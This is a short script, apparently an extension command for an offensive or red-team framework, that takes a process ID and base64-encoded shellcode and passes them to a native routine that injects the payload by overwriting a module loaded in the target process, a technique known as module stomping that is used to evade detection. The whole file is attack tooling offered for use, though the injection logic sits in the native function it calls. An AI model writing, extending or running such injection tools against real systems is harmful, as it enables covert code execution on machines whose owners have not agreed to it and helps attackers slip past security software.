// Usage: extension load inject_auto_stomp <pid> <b64_shellcode>
// Description: Automatically finds a module in the target process to overwrite.

if args.len() < 2 {
    return "Usage: inject_auto_stomp <pid> <base64_shellcode>";
}

let pid = args[0];
let payload = args[1];

print_log("[*] Hunting for stompable modules in PID " + pid + "...");
return native_inject_module_stomping_auto(pid, payload);
